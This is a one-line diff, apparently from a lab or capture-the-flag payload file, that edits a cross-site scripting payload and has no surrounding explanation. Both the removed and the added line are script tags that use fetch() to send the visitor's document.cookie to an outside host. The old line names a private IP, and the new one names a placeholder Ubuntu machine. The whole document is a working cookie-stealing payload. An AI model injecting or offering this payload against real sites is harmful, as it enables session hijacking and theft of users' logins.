@@ -1,1 +1,1 @@
-<script>fetch('http://10.42.231.179/.session=' + encodeURIComponent(document.cookie))</script>
+<script>fetch(`http://<ubuntu ip>/${document.cookie}`)</script>
